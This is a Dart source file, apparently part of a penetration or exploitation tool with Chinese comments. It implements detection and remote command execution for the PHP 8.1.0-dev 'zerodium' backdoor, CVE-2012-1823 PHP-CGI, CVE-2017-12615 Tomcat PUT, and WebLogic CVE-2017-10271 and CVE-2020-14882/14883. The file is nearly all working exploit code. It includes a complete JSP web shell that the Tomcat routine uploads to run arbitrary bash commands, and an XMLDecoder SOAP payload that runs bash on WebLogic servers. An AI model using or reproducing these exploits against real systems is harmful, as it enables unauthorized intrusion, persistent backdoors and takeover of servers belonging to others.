import 'dart:convert';
import 'dart:io';

import '../../../core/http/http_client.dart';
import '../../../core/http/http_result.dart';

import 'exp_result.dart';
import 'rce_encoder.dart';

class PhpBackdoorExpService {
  final String baseUrl;
  final String phpPath;
  final Duration timeout;

  PhpBackdoorExpService({
    required this.baseUrl,
    this.phpPath = '/index.php',
    this.timeout = const Duration(seconds: 10),
  });

  String get _base =>
      baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;

  late final MatrixHttpClient _httpClient = MatrixHttpClient(
    baseUrl: baseUrl,
    timeout: timeout,
    allowBadCertificate: false,
  );

  Future<ExpResult> check() async {
    try {
      final res = await _httpClient.getOrThrow(
        '$_base$phpPath',
        headers: {'User-Agentt': 'zerodiumsystem("echo PHP_BACKDOOR_54289");'},
      );
      if ((res.body ?? '').contains('PHP_BACKDOOR_54289')) {
        return ExpResult(true, 'PHP 8.1.0-dev 后门', 'User-Agentt 后门存在，回显验证通过');
      }
    } catch (e) {
      return ExpResult.probeFailed('PHP 8.1.0-dev 后门', '探测失败: $e');
    }
    return ExpResult(false, 'PHP 8.1.0-dev 后门', '');
  }

  static const _sentinel = 'PHP_RCE_OUT';

  static String? _extract(String body) {
    const s = '${_sentinel}_S';
    const e = '${_sentinel}_E';
    final start = body.indexOf(s);
    final end = body.indexOf(e);
    if (start == -1 || end == -1 || end <= start) return null;
    return body.substring(start + s.length, end).trim();
  }

  Future<String?> execRce(String cmd) async {
    try {
      // PHP 双引号串会插值 $var：必须用单引号字面量，否则 `echo $HOME`
      // 会被 PHP 当成变量、命令变成 `echo `（实测丢参数）。
      final escaped = RceEncoder.phpSingleQuoted(cmd);
      final res = await _httpClient.getOrThrow(
        '$_base$phpPath',
        headers: {
          'User-Agentt':
              "zerodiumecho '${_sentinel}_S';system('$escaped');echo '${_sentinel}_E';",
        },
      );
      final body = res.body ?? '';
      if (body.isEmpty) return null;
      return _extract(body) ?? body;
    } catch (_) {
      return null;
    }
  }
}

class PhpCgiExpService {
  final String baseUrl;
  final String phpPath;
  final Duration timeout;

  PhpCgiExpService({
    required this.baseUrl,
    this.phpPath = '/index.php',
    this.timeout = const Duration(seconds: 10),
  });

  String get _base =>
      baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;

  late final MatrixHttpClient _httpClient = MatrixHttpClient(
    baseUrl: baseUrl,
    timeout: timeout,
    allowBadCertificate: false,
  );

  Future<ExpResult> check() async {
    try {
      final url =
          '$_base$phpPath?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input';
      final res = await _httpClient.postOrThrow(
        url,
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: '<?php echo "PHP_CGI_54289"; ?>',
      );
      if ((res.body ?? '').contains('PHP_CGI_54289')) {
        return ExpResult(
          true,
          'CVE-2012-1823 (PHP-CGI)',
          'PHP-CGI 参数注入代码执行验证通过',
        );
      }
    } catch (e) {
      return ExpResult.probeFailed('CVE-2012-1823 (PHP-CGI)', '探测失败: $e');
    }
    return ExpResult(false, 'CVE-2012-1823 (PHP-CGI)', '');
  }

  Future<String?> execRce(String cmd) async {
    try {
      final url =
          '$_base$phpPath?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input';
      final escaped = RceEncoder.phpSingleQuoted(cmd);
      const begin = 'MATRIX_CGI_BEGIN';
      const end = 'MATRIX_CGI_END';
      final res = await _httpClient.postOrThrow(
        url,
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: "<?php echo '$begin'; echo shell_exec('$escaped'); echo '$end'; ?>",
      );
      final body = res.body ?? '';
      final s = body.indexOf(begin);
      final e = body.indexOf(end);
      if (s != -1 && e != -1 && e > s) {
        final extracted = body.substring(s + begin.length, e).trim();
        return extracted.isNotEmpty ? extracted : null;
      }
      return body.isNotEmpty ? body : null;
    } catch (_) {
      return null;
    }
  }
}

class TomcatExpService {
  final String baseUrl;
  final Duration timeout;

  TomcatExpService({
    required this.baseUrl,
    this.timeout = const Duration(seconds: 10),
  });

  String get _base =>
      baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;

  late final MatrixHttpClient _httpClient = MatrixHttpClient(
    baseUrl: baseUrl,
    timeout: timeout,
    allowBadCertificate: false,
  );

  static const _shellName = 'mAtrix_t_shell';
  static const _shellContent =
      '<%@ page import="java.util.*,java.io.*"%><%if(request.getParameter("cmd")!=null){Process p=Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",request.getParameter("cmd")});BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));StringBuilder sb=new StringBuilder();String line;while((line=br.readLine())!=null)sb.append(line).append("\\n");out.print(sb);}%>';

  Future<ExpResult> check() async {
    try {
      const probeJsp = '<% out.print("TOMCAT_JSP_54289"); %>';
      final putJspRes = await _httpClient.put(
        '$_base/tomcat_check_54289.jsp/',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: probeJsp,
      );
      // PUT 没有 orThrow 包装：网络层失败时必须显式区分，否则会落到"未发现"。
      if (!putJspRes.isOk) {
        return ExpResult.probeFailed(
          'CVE-2017-12615',
          '探测失败: ${putJspRes.error ?? 'no response'}',
        );
      }
      if (putJspRes.statusCode == 201 || putJspRes.statusCode == 204) {
        final jspGetRes =
            await _httpClient.getOrThrow('$_base/tomcat_check_54289.jsp');
        if ((jspGetRes.body ?? '').contains('TOMCAT_JSP_54289')) {
          return ExpResult(
            true,
            'CVE-2017-12615',
            'PUT 写入 JSP 并成功执行回显，RCE 链路成立',
          );
        }
      }

      final putRes = await _httpClient.put(
        '$_base/tomcat_put_test.txt/',
        headers: {'Content-Type': 'text/plain'},
        body: 'tomcat_put_54289',
      );
      if (putRes.statusCode == 201 || putRes.statusCode == 204) {
        final getRes =
            await _httpClient.getOrThrow('$_base/tomcat_put_test.txt');
        if ((getRes.body ?? '').contains('tomcat_put_54289')) {
          return ExpResult(true, 'CVE-2017-12615', 'PUT 方法开启，文件写入并读取验证成功');
        }
        return ExpResult(
          true,
          'CVE-2017-12615',
          'PUT 方法开启 (状态 ${putRes.statusCode})',
        );
      }
    } catch (e) {
      return ExpResult.probeFailed('CVE-2017-12615', '探测失败: $e');
    }
    return ExpResult(false, 'CVE-2017-12615', '');
  }

  Future<String?> getShell() async {
    try {
      final putRes = await _httpClient.put(
        '$_base/$_shellName.jsp/',
        headers: {'Content-Type': 'application/octet-stream'},
        body: _shellContent,
      );
      if (putRes.statusCode == 201 || putRes.statusCode == 204) {
        return '$_base/$_shellName.jsp';
      }
    } catch (_) {}
    return null;
  }

  Future<String?> execRce(String cmd) async {
    try {
      await _httpClient.put(
        '$_base/$_shellName.jsp/',
        headers: {'Content-Type': 'application/octet-stream'},
        body: _shellContent,
      );
      await Future<void>.delayed(const Duration(milliseconds: 300));
      final res = await _httpClient.getOrThrow(
        '$_base/$_shellName.jsp?cmd=${Uri.encodeComponent(cmd)}',
      );
      final respBody = res.body ?? '';
      return respBody.isNotEmpty ? respBody : null;
    } catch (_) {
      return null;
    }
  }
}

class WebLogicExpService {
  final String baseUrl;
  final Duration timeout;

  WebLogicExpService({
    required this.baseUrl,
    this.timeout = const Duration(seconds: 10),
  });

  String get _base =>
      baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;

  late final MatrixHttpClient _httpClient = MatrixHttpClient(
    baseUrl: baseUrl,
    timeout: timeout,
    allowBadCertificate: false,
  );

  String _xmlDecoderPayload(String cmd) {
    final safe = RceEncoder.xmlEscape(cmd);
    return '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
<soapenv:Header>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java version="1.4.0" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
  <array class="java.lang.String" length="3">
    <void index="0"><string>/bin/bash</string></void>
    <void index="1"><string>-c</string></void>
    <void index="2"><string>$safe</string></void>
  </array>
  <void method="start"/>
</void>
</java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body/>
</soapenv:Envelope>''';
  }

  static const List<String> _xmlDecoderProbePaths = <String>[
    '/wls-wsat/CoordinatorPortType',
    '/wls-wsat/CoordinatorPortType11',
    '/wls-wsat/RegistrationPortTypeRPC',
    '/wls-wsat/ParticipantPortType',
    '/wls-wsat/CoordinatorPortType/',
  ];

  bool _looksLikeXmlDecoderEndpointResponse(HttpResult res) {
    final code = res.statusCode ?? 0;
    final body = (res.body ?? '').toLowerCase();
    final isPotentialCode = code == 200 || code == 202 || code == 500;
    final hasSoapOrFaultSignal = body.contains('soap') ||
        body.contains('fault') ||
        body.contains('weblogic.wsee') ||
        body.contains('workcontext') ||
        body.contains('xmldecoder');
    return isPotentialCode || hasSoapOrFaultSignal;
  }

  String? _pickXmlTag(String xml, String tag) {
    final reg = RegExp('<$tag[^>]*>([\\s\\S]*?)</$tag>', caseSensitive: false);
    final m = reg.firstMatch(xml);
    if (m == null) return null;
    final v = m.group(1)?.trim();
    return (v == null || v.isEmpty) ? null : v;
  }

  String? _pickXmlAttr(String xml, String tag, String attr) {
    final reg = RegExp(
      '<$tag[^>]*\\s$attr="([^"]+)"[^>]*>',
      caseSensitive: false,
    );
    final m = reg.firstMatch(xml);
    final v = m?.group(1)?.trim();
    return (v == null || v.isEmpty) ? null : v;
  }

  String _formatXmlDecoderExecResponse(HttpResult res) {
    final code = res.statusCode ?? 0;
    final body = (res.body ?? '').trim();
    if (body.isEmpty) {
      return '命令已发送 (HTTP $code)，无响应体';
    }

    final lower = body.toLowerCase();
    final isSoap = lower.contains('<s:envelope') ||
        lower.contains('<soapenv:envelope') ||
        lower.contains('<fault');
    if (!isSoap) return body;

    final faultCode = _pickXmlTag(body, 'faultcode');
    final faultString = _pickXmlTag(body, 'faultstring');
    final exClass = _pickXmlAttr(body, 'ns2:exception', 'class') ??
        _pickXmlAttr(body, 'exception', 'class');
    final exMsg = _pickXmlTag(body, 'message');

    final lines = <String>[
      'SOAP 响应 (HTTP $code)',
      if (faultCode != null) 'faultcode: $faultCode',
      if (faultString != null) 'faultstring: $faultString',
      if (exClass != null) 'exception: $exClass',
      if (exMsg != null) 'message: $exMsg',
      if (faultString == '0' || exClass?.contains('ArrayIndexOutOfBoundsException') == true)
        '提示: 该特征通常表示 XMLDecoder 链路已被触发（常见于无回显执行）',
    ];
    return lines.join('\n');
  }

  Future<ExpResult> checkCve201710271() async {
    Object? lastError;
    var anyResponse = false;
    for (final path in _xmlDecoderProbePaths) {
      try {
        final res = await _httpClient.postOrThrow(
          '$_base$path',
          headers: const {
            'Content-Type': 'text/xml; charset=UTF-8',
            'SOAPAction': '""',
          },
          body: _xmlDecoderPayload('id'),
        );
        anyResponse = true;
        if (_looksLikeXmlDecoderEndpointResponse(res)) {
          final code = res.statusCode ?? 0;
          return ExpResult(
            true,
            'CVE-2017-10271',
            'WebLogic XMLDecoder 端点存在 ($path, HTTP $code)',
          );
        }
      } catch (e) {
        // 继续探测其它已知 WSAT 端点，但记录最后一次异常。
        lastError = e;
      }
    }
    if (!anyResponse && lastError != null) {
      return ExpResult.probeFailed('CVE-2017-10271', '探测失败: $lastError');
    }
    return const ExpResult(false, 'CVE-2017-10271', '');
  }

  Future<String?> execRceCve201710271(String cmd) async {
    try {
      final res = await _httpClient.postOrThrow(
        '$_base/wls-wsat/CoordinatorPortType',
        headers: {'Content-Type': 'text/xml'},
        body: _xmlDecoderPayload(cmd),
      );
      return _formatXmlDecoderExecResponse(res);
    } catch (_) {
      return null;
    }
  }

  Future<ExpResult> checkCve202014882() async {
    // Must NOT follow redirects: the bypass returns 302 → console.portal.
    // If we follow, the redirect target may 404 and we'd miss the detection.
    // A Location header containing 'console.portal' confirms the server decoded
    // %252e%252e%252f → %2e%2e%2f and routed it as a path-traversal bypass.
    //
    // TLS：WebLogic 控制台常用自签证书。默认**严格校验**；只有握手失败时才放宽
    // 一次，并在 detail 里写明"已放宽证书校验"，避免静默接受任意证书。
    for (final relaxedTls in const <bool>[false, true]) {
      final client = HttpClient();
      if (relaxedTls) {
        client.badCertificateCallback = (_, __, _) => true;
      }
      try {
        final uri = Uri.parse(
          '$_base/console/css/%252e%252e%252fconsole.portal',
        );
        final req = await client.getUrl(uri).timeout(timeout);
        req.followRedirects = false;
        final res = await req.close().timeout(timeout);
        final location = (res.headers.value('location') ?? '').toLowerCase();
        final bytes = await res.fold<List<int>>(
          <int>[],
          (a, b) => a..addAll(b),
        );
        final body = utf8.decode(bytes, allowMalformed: true);
        final bodyLower = body.toLowerCase();

        final isRedirect = res.statusCode >= 300 && res.statusCode < 400;
        final hasBypassLocation = location.contains('console.portal') ||
            location.contains('%2e%2e%2fconsole.portal') ||
            location.contains('_pagelabel=');
        final hasBypassBody = bodyLower.contains('console.portal') ||
            bodyLower.contains('_pagelabel=') ||
            bodyLower.contains('weblogic server console');

        if ((isRedirect && hasBypassLocation) ||
            (res.statusCode == 200 && hasBypassBody)) {
          final tlsNote = relaxedTls ? '（目标为自签证书，已放宽校验）' : '';
          return ExpResult(
            true,
            'CVE-2020-14882/14883',
            isRedirect
                ? '控制台路径绕过成功，HTTP ${res.statusCode}, Location: $location$tlsNote'
                : '控制台路径绕过成功，HTTP 200 命中控制台特征$tlsNote',
          );
        }
        return const ExpResult(false, 'CVE-2020-14882/14883', '');
      } on HandshakeException catch (e) {
        // 严格校验失败：仅当是证书问题时放宽重试一次。
        if (!relaxedTls) continue;
        return ExpResult.probeFailed(
          'CVE-2020-14882/14883',
          '探测失败: TLS 握手失败（$e）',
        );
      } catch (e) {
        return ExpResult.probeFailed('CVE-2020-14882/14883', '探测失败: $e');
      } finally {
        client.close();
      }
    }
    return const ExpResult(false, 'CVE-2020-14882/14883', '');
  }

  Future<String?> execRceCve202014882(String cmd) async {
    // ShellSession uses getRuntime().exec(String[]) under the hood — shell
    // redirects (>&, |, etc.) don't work unless wrapped with sh -c.
    // Response body is always the console HTML page; command output goes to
    // the server-side process only, so we never show the body.
    try {
      final safeCmd = cmd.replaceAll(r'\', r'\\').replaceAll("'", r"\'");
      final groovyCmd =
          "java.lang.Runtime.getRuntime().exec(new String[]{'/bin/sh','-c','$safeCmd'});";
      final handle = Uri.encodeQueryComponent(
        'com.tangosol.coherence.mvel2.sh.ShellSession("$groovyCmd")',
      );
      final url =
          '$_base/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=$handle';
      final res = await _httpClient.getOrThrow(url);
      if (res.statusCode == 200 || res.statusCode == 302) {
        return '命令已发送 (状态 ${res.statusCode})，ShellSession 无直接回显';
      }
      return null;
    } catch (_) {
      return null;
    }
  }
}
